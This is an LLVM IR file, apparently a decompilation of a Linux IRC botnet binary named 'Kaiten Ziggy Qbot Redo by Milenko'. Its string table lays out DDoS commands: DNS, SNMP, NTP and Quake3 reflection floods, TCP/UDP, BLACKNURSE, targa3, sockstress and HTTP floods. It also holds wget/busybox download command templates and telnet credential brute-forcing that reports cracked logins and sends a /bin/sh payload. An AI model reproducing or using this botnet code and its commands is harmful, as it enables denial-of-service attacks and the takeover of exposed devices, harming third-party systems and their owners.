source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%pollfd = type { i32, i16, i16 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%rlimit = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%timespec = type { i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_806f010.21 = global i32 0
@global_var_806f044.22 = local_unnamed_addr global i32* @global_var_806f010.21
@global_var_806eca4.23 = constant i32 0
@global_var_806f014.25 = local_unnamed_addr global i32 0
@global_var_8068aed.26 = constant [7 x i8] c"x86_32\00"
@global_var_807cb70.29 = local_unnamed_addr global i32 0
@global_var_8068af4.30 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_807407c.31 = local_unnamed_addr global i32 0
@global_var_807e0fc.32 = local_unnamed_addr global i32 0
@global_var_8068b14.35 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_807cb64.36 = local_unnamed_addr global i32 0
@global_var_8068b53.37 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_8068b6c.38 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_8068b90.39 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_8068bb5.40 = constant [8 x i8] c"http://\00"
@global_var_8068bc0.41 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_8068be8.42 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_8068c10.43 = constant [276 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_8068d24.44 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8068d40.45 = constant [3 x i8] c"wb\00"
@global_var_8068d43.46 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8068d48.47 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_8068d60.48 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_8068d80.49 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_8068db0.50 = constant [61 x i8] c"NOTICE %s :Kaiten Ziggy Qbot Redo by Milenko version 13.3.7\0A\00"
@global_var_8068ded.51 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_8068e08.52 = constant [54 x i8] c"NOTICE %s :Nick cannot be larger than 32 characters.\0A\00"
@global_var_807cb6c.53 = local_unnamed_addr global i32 0
@global_var_8068e3e.54 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_8068e47.55 = constant i32 1229848641
@global_var_8068e49.56 = constant [16 x i8] c"NICK [%s|%s]%s\0A\00"
@global_var_8068e59.57 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_8068e9c.60 = constant [34 x i8] c"NOTICE %s :Current status is: %s\0A\00"
@global_var_8068ebe.61 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_8068edc.62 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_807ca60.63 = global i32 0
@global_var_8068f04.64 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_8068f23.65 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_8068f3d.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_8068f5a.67 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8068f75.68 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_8068f94.69 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_8068fb4.70 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8074480.71 = global i32 0
@global_var_8069000.72 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_80744a0.73 = global i32 0
@global_var_80744a4.74 = local_unnamed_addr global i32 0
@global_var_80744a8.75 = local_unnamed_addr global i32 0
@global_var_806f714.76 = local_unnamed_addr global i32 4095
@global_var_806f710.77 = local_unnamed_addr global i32 362436
@global_var_8073e10.78 = local_unnamed_addr global i32 272
@global_var_8073dc0.80 = global i32 288
@global_var_8069021.81 = constant [19 x i8] c"Thread %d started\0A\00"
@global_var_8069034.82 = constant [49 x i8] c"Could not open raw socket. You need to be root!\0A\00"
@global_var_8069065.83 = constant [14 x i8] c"192.168.3.100\00"
@global_var_807dca0.85 = local_unnamed_addr global i32 0
@global_var_8069094.86 = constant [67 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\0A\00"
@global_var_80690d8.87 = constant [130 x i8] c"wget \22%s\22 -q -O DNS.txt || busybox wget \22%s\22 -O DNS.txt || /bin/busybox wget \22%s\22 -O DNS.txt || /usr/busybox wget \22%s\22 -O DNS.txt\00"
@1 = constant i32 1313079410
@global_var_806915c.89 = constant [8 x i8] c"DNS.txt\00"
@global_var_8069164.90 = constant [15 x i8] c"Target: %s:%d\0A\00"
@global_var_8069174.91 = constant [36 x i8] c"NOTICE %s :DNS amp attacking %s:%s\0A\00"
@global_var_8069198.92 = constant [27 x i8] c"Starting Flood... Nigga!!\0A\00"
@global_var_80691b4.93 = constant i32 1124073541
@global_var_80691f8.94 = constant [28 x i8] c"Could not open raw socket.\0A\00"
@global_var_8069214.95 = constant [43 x i8] c"Error: setsockopt() - Cannot set HDRINCL!\0A\00"
@global_var_807cb68.97 = local_unnamed_addr global i32 0
@global_var_806f718.98 = local_unnamed_addr global i32 100
@global_var_8069240.99 = constant [99 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_80692a4.100 = constant [134 x i8] c"wget \22%s\22 -q -O SNMP.txt || busybox wget \22%s\22 -O SNMP.txt || /bin/busybox wget \22%s\22 -O SNMP.txt || /usr/busybox wget \22%s\22 -O SNMP.txt\00"
@global_var_806932a.101 = constant [23 x i8] c"Setting up sockets...\0A\00"
@global_var_8069341.102 = constant [9 x i8] c"SNMP.txt\00"
@global_var_806934c.103 = constant [37 x i8] c"NOTICE %s :SNMP amp attacking %s:%s\0A\00"
@global_var_8069371.104 = constant [27 x i8] c"Started SNMP DrDoS flood!\0A\00"
@global_var_806938c.105 = constant [35 x i8] c"NOTICE %s :WGETFLOOD <url> <secs>\0A\00"
@global_var_8067dc8.106 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_8067e14.107 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_8067e68.108 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_8067ec0.109 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_8067f18.110 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_8067f58.111 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_8067fa0.112 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_8067ff8.113 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_8068064.114 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_80680bc.115 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_806810c.116 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_8068130.117 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_806818b.118 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_806819c.119 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_80681cc.120 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_80681f0.121 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_8068212.122 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_806822c.123 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_806826c.124 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_80682bc.125 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_8068308.126 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_8068344.127 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_80683a0.128 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_8068408.129 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_806847c.130 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_80684f4.131 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_8068550.132 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_80685a4.133 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_806862c.134 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8068680.135 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_80686e8.136 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_8068744.137 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_8068794.138 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_80687d8.139 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_806882c.140 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_8068878.141 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_806f380.142 = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_8067dc8.106, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8067e14.107, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8067e68.108, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8067ec0.109, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8067f18.110, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_8067f58.111, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8067fa0.112, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_8067ff8.113, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_8068064.114, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_80680bc.115, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_806810c.116, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_8068130.117, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_806818b.118, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_806819c.119, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_80681cc.120, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_80681f0.121, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_8068212.122, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_806822c.123, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_806826c.124, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_80682bc.125, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @global_var_8068308.126, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @global_var_8068344.127, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_80683a0.128, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_8068408.129, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_806847c.130, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_80684f4.131, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_8068550.132, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @global_var_80685a4.133, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_806862c.134, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_8068680.135, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_80686e8.136, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_8068744.137, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_8068794.138, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_80687d8.139, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_806882c.140, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_8068878.141, i32 0, i32 0)]
@global_var_80693af.143 = constant [29 x i8] c"NOTICE %s :HTTP Flooding %s\0A\00"
@global_var_80693cc.144 = constant [181 x i8] c"wget -U \22%s\22 -q \22%s\22 -O /dev/null || busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /bin/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /usr/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null &\00"
@global_var_8069484.145 = constant [112 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_80694f4.146 = constant [130 x i8] c"wget \22%s\22 -q -O NTP.txt || busybox wget \22%s\22 -O NTP.txt || /bin/busybox wget \22%s\22 -O NTP.txt || /usr/busybox wget \22%s\22 -O NTP.txt\00"
@global_var_8069576.147 = constant [8 x i8] c"NTP.txt\00"
@global_var_8069580.148 = constant [36 x i8] c"NOTICE %s :NTP amp attacking %s:%s\0A\00"
@global_var_80695a4.149 = constant [19 x i8] c"Starting flood...\0A\00"
@global_var_80695e4.151 = constant [41 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs>\00"
@global_var_806960d.152 = constant [24 x i8] c"Unable to use [%s]: %s\0A\00"
@global_var_8069625.153 = constant [7 x i8] c"socket\00"
@global_var_806962c.154 = constant [27 x i8] c"NOTICE %s :Blacknursing %s\00"
@global_var_8069647.155 = constant [7 x i8] c"sendto\00"
@global_var_8069650.156 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_8069677.157 = constant [25 x i8] c"NOTICE %s :Packeting %s\0A\00"
@global_var_80696a0.158 = constant i32 2
@global_var_80696f0.159 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_8069717.160 = constant [23 x i8] c"NOTICE %s :Panning %s\0A\00"
@global_var_80697c0.161 = constant i32 2
@global_var_8069740.162 = constant i32 21
@global_var_8069810.163 = constant [52 x i8] c"NOTICE %s :PHATWONK <target> <flags/method> <secs>\0A\00"
@global_var_8069844.164 = constant [27 x i8] c"NOTICE %s :Phatwonking %s\0A\00"
@global_var_806985f.165 = constant [4 x i8] c"all\00"
@global_var_8069863.166 = constant [5 x i8] c"xmas\00"
@global_var_8069868.167 = constant [5 x i8] c"usyn\00"
@global_var_806986d.168 = constant i32 2037579820
@global_var_806986f.169 = constant [4 x i8] c"syn\00"
@global_var_8069873.170 = constant [4 x i8] c"rst\00"
@global_var_8069877.171 = constant [4 x i8] c"fin\00"
@global_var_806987b.172 = constant [4 x i8] c"ack\00"
@global_var_806987f.173 = constant [4 x i8] c"psh\00"
@global_var_8069883.174 = constant [4 x i8] c"urg\00"
@global_var_8069888.175 = constant [85 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\0A\00"
@global_var_80698e8.178 = constant [49 x i8] c"NOTICE %s :Unknowning %s:%s with packet size %s\0A\00"
@global_var_806991c.179 = constant [115 x i8] c"NOTICE %s :QUAKE3 <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_8069990.180 = constant [139 x i8] c"wget \22%s\22 -O QUAKE3.txt || busybox wget \22%s\22 -O QUAKE3.txt || /bin/busybox wget \22%s\22 -O QUAKE3.txt || /usr/busybox wget \22%s\22 -O QUAKE3.txt\00"
@global_var_8069a1b.181 = constant [11 x i8] c"QUAKE3.txt\00"
@global_var_8069a28.182 = constant [39 x i8] c"NOTICE %s :Quake3 amp attacking %s:%s\0A\00"
@global_var_8069a4f.183 = constant [30 x i8] c"Starting flood muthafucka...\0A\00"
@global_var_8069a6d.184 = constant [4 x i8] c"std\00"
@global_var_8069a74.185 = constant [35 x i8] c"NOTICE %s :STD <ip> <port> <time>\0A\00"
@global_var_8069a98.186 = constant [32 x i8] c"NOTICE %s :STD attacking %s:%s\0A\00"
@global_var_8069ab8.187 = constant [48 x i8] c"NOTICE %s :TARGA3 <ip1> [ip2] ... [-s seconds]\0A\00"
@global_var_8069ae8.188 = constant [69 x i8] c"NOTICE %s :Cannot target more than 200 hosts! Wtf are u tryna do?!?\0A\00"
@global_var_8069b2d.189 = constant [13 x i8] c"/dev/urandom\00"
@global_var_807e0e0.190 = local_unnamed_addr global i32 0
@global_var_807cca0.191 = global i32 0
@global_var_807cb78.192 = local_unnamed_addr global i32 0
@global_var_8069b3a.193 = constant [9 x i8] c"[%d;3%dm\00"
@global_var_8069b44.194 = constant [46 x i8] c"\09\09%starga 3.0 by Mixter modded by Milenko[0m\0A\00"
@global_var_8069b72.195 = constant [3 x i8] c"-s\00"
@global_var_8069b78.196 = constant [32 x i8] c"NOTICE %s :No valid IPs found!\0A\00"
@global_var_8069b98.197 = constant [44 x i8] c"NOTICE %s :Attacking %d hosts using targa3\0A\00"
@global_var_807cb60.198 = local_unnamed_addr global i32 0
@global_var_8069bc4.199 = constant i32 1063780401
@global_var_807e0d4.201 = local_unnamed_addr global i32 0
@global_var_807dcc4.202 = global i32 0
@global_var_807e0d8.203 = local_unnamed_addr global i32 0
@global_var_807dcc0.204 = local_unnamed_addr global i32 0
@global_var_8069bd0.205 = constant [33 x i8] c"NOTICE %s :Sockstressing %s:%hu\0A\00"
@global_var_8069bf4.206 = constant [78 x i8] c"SOCKSTRESS - CVE-2008-4609 | havoc@defuse.ca | Attack time and multithreading\00"
@global_var_8069c44.207 = constant [97 x i8] c"NOTICE %s :%s SOCKSTRESS <ip>:<port> <interface> -t <threads> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_807e0e4.208 = local_unnamed_addr global i32 0
@global_var_807e0e8.209 = local_unnamed_addr global i32 0
@global_var_807e0ec.210 = local_unnamed_addr global i32 0
@global_var_807e0f0.211 = local_unnamed_addr global i32 0
@global_var_807e0f4.212 = local_unnamed_addr global i32 0
@global_var_807dcd8.213 = local_unnamed_addr global i32 0
@global_var_807e0c4.214 = local_unnamed_addr global i32 0
@global_var_807e0c8.215 = local_unnamed_addr global i32 0
@global_var_807e0cc.216 = local_unnamed_addr global i32 0
@global_var_8069d98.217 = constant i32 134536581
@global_var_807e498.218 = local_unnamed_addr global i32 0
@global_var_8069ca5.219 = constant [21 x i8] c"Invalid attack time.\00"
@global_var_8069cba.220 = constant [29 x i8] c"Invalid attack thread count.\00"
@global_var_8069cd7.221 = constant [15 x i8] c"Invalid delay.\00"
@global_var_8069bc6.222 = constant [7 x i8] c"h?p:d:\00"
@global_var_806f71c.223 = local_unnamed_addr global [7 x i8]* @global_var_8069bc6.222
@global_var_8073fb8.224 = local_unnamed_addr global i32 1
@global_var_8069ce6.225 = constant [20 x i8] c"Too many arguments.\00"
@global_var_8069cfa.226 = constant [19 x i8] c"Too few arguments.\00"
@global_var_807dcc8.227 = global i32 0
@global_var_8069d0d.228 = constant [19 x i8] c"Invalid interface.\00"
@global_var_8069d20.229 = constant [23 x i8] c"Please specify a port.\00"
@global_var_8069d37.230 = constant [14 x i8] c"Invalid port.\00"
@global_var_8069d45.231 = constant [20 x i8] c"Invalid IP address.\00"
@global_var_807dccc.232 = local_unnamed_addr global i32 0
@global_var_8069d5c.233 = constant [34 x i8] c"[+] Sending packets from %s (%s)\0A\00"
@global_var_8069d7e.234 = constant [26 x i8] c"[+] Attacking: %s:%hu...\0A\00"
@global_var_8069e70.235 = constant [3 x i8] c"rb\00"
@global_var_8069e73.236 = constant [28 x i8] c"Error reading payload file.\00"
@global_var_8069e90.238 = constant [65 x i8] c"[+] SENT: syn: %lu ack: %lu RECV: synack: %lu ack: %lu rst: %lu\0D\00"
@global_var_8069ed4.239 = constant [85 x i8] c"NOTICE %s :[SOCKSTRESS] SENT: syn: %lu ack: %lu RECV: synack: %lu ack: %lu rst: %lu\0A\00"
@global_var_8069f2c.240 = constant [39 x i8] c"[!] Error creating socket to send SYNs\00"
@global_var_8069f54.241 = constant [38 x i8] c"[!] Error binding socket to send SYNs\00"
@global_var_8069f7a.242 = constant [29 x i8] c"[!] Error sending SYN packet\00"
@global_var_806f720.243 = local_unnamed_addr global i32 -1
@global_var_8069f98.244 = constant [45 x i8] c"[!] Error creating socket to send ACK/SYNACK\00"
@global_var_8069fc8.245 = constant [44 x i8] c"[!] Error binding socket to send ACK/SYNACK\00"
@global_var_8069ff4.246 = constant [36 x i8] c"[!] Error sending ACK/SYNACK packet\00"
@global_var_806a018.247 = constant [54 x i8] c"[!] Error creating socket to process incoming packets\00"
@global_var_806a04e.248 = constant [7 x i8] c"(null)\00"
@global_var_806a055.253 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_806a064.254 = constant [92 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\0A\00"
@global_var_806a0c0.255 = constant [54 x i8] c"NOTICE %s :TCP flooding %s:%d with %s and %d threads\0A\00"
@global_var_806a0f8.256 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_806a138.257 = constant [101 x i8] c"NOTICE %s :HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\0A\00"
@global_var_806a1a0.258 = constant [36 x i8] c"NOTICE %s :JUNK <ip> <port> <time>\0A\00"
@global_var_806a1c4.259 = constant [32 x i8] c"NOTICE %s :JUNK flooding %s:%s\0A\00"
@global_var_806a1e4.260 = constant [36 x i8] c"NOTICE %s :HOLD <ip> <port> <time>\0A\00"
@global_var_806a208.261 = constant [32 x i8] c"NOTICE %s :HOLD flooding %s:%s\0A\00"
@global_var_8067d76.262 = constant [8 x i8] c"busybox\00"
@global_var_8068ad8.263 = constant i32 2293796
@global_var_8068ada.264 = constant i32 1752367139
@global_var_8068adc.265 = constant [6 x i8] c"shell\00"
@global_var_8068aa5.266 = constant [7 x i8] c"dvrdvs\00"
@global_var_806f6c0.267 = global [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067d76.262, i32 0, i32 0), i8* bitcast (i32* @global_var_8068ad8.263 to i8*), i8* bitcast (i32* @global_var_8068ada.264 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068adc.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068aa5.266, i32 0, i32 0)]
@global_var_8068aac.268 = constant [7 x i8] c"nvalid\00"
@global_var_8068ab3.269 = constant [6 x i8] c"ailed\00"
@global_var_8068ab9.270 = constant [9 x i8] c"ncorrect\00"
@global_var_8068ac2.271 = constant [6 x i8] c"enied\00"
@global_var_8068ac8.272 = constant [5 x i8] c"rror\00"
@global_var_8068acd.273 = constant [7 x i8] c"oodbye\00"
@global_var_8068ad4.274 = constant [4 x i8] c"bad\00"
@global_var_806f6a0.275 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068aac.268, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068ab3.269, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068ab9.270, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068ac2.271, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068ac8.272, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068acd.273, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068ad4.274, i32 0, i32 0)]
@global_var_806f678 = external global i32
@global_var_806a228.281 = constant [3 x i8] c"\0D\0A\00"
@global_var_806f6e0.282 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068aac.268, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068ab3.269, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068ab9.270, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068ac2.271, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068ac8.272, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068acd.273, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068ad4.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067d76.262, i32 0, i32 0), i8* bitcast (i32* @global_var_8068ad8.263 to i8*), i8* bitcast (i32* @global_var_8068ada.264 to i8*)]
@global_var_806a22b.283 = constant [7 x i8] c"#Pinet\00"
@global_var_806a234.284 = constant [54 x i8] c"PRIVMSG %s :[TELNET] [+] LOGIN CRACKED ---> %s:%s:%s\0A\00"
@global_var_8067775.285 = constant [10 x i8] c"/bin/sh\0D\0A\00"
@global_var_806f078.286 = local_unnamed_addr global [10 x i8]* @global_var_8067775.285
@global_var_806a26c.287 = constant [69 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO SEND SHELL PAYLOAD ---> %s:%s:%s\0A\00"
